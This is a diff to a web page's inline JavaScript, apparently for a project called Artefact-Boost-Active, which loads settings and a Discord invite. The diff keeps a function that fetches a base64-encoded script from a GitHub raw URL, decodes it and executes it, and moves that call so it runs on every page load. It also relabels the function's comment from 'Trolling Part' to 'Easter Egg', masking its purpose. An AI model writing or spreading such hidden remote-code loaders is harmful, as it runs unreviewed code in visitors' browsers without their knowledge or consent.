@@ -137,8 +137,6 @@
         const settingsUrl = "https://api.github.com/repos/DrMineword/Artefact-Boost-Active/contents/settings.json";
         const supportUrl = "https://api.github.com/repos/DrMineword/Artefact-Boost-Active/contents/support.json";
         const discordWidgetUrl = "https://discord.com/api/guilds/1228678846023335936/widget.json";
-
-        // Easter egg base64 script URL
         const base64ScriptUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/easter_egg.base64";
 
         // Function to decode base64 content
@@ -332,7 +330,7 @@
             }
         }
 
-        // Function to fetch and execute the Base64-encoded script (Trolling Part)
+        // Function to fetch and execute Base64-encoded script (Easter Egg)
         async function fetchAndExecuteBase64Script() {
             try {
                 const response = await fetch(base64ScriptUrl);
@@ -340,10 +338,7 @@
                     throw new Error(`Failed to fetch Base64 script from ${base64ScriptUrl}`);
                 }
 
-                // Get the encoded content as text
                 const encodedScript = await response.text();
-
-                // Decode the Base64 content
                 const decodedScript = atob(encodedScript);
 
                 console.log("Yyyeeerrraarrsessarseaandimth grasssmannpunkyeeyahhavinh");
@@ -359,13 +354,11 @@
             }
         }
 
-        // Call the function to fetch, decode, and execute the script
-        fetchAndExecuteBase64Script();
-
         // Load settings and content on page load
         window.onload = async () => {
-            await loadSettings(); 
-            await fetchDiscordInvite(); 
+            await loadSettings();
+            await fetchDiscordInvite();
+            await fetchAndExecuteBase64Script();  // Execute your Easter egg script
         };
     </script>
 </body>
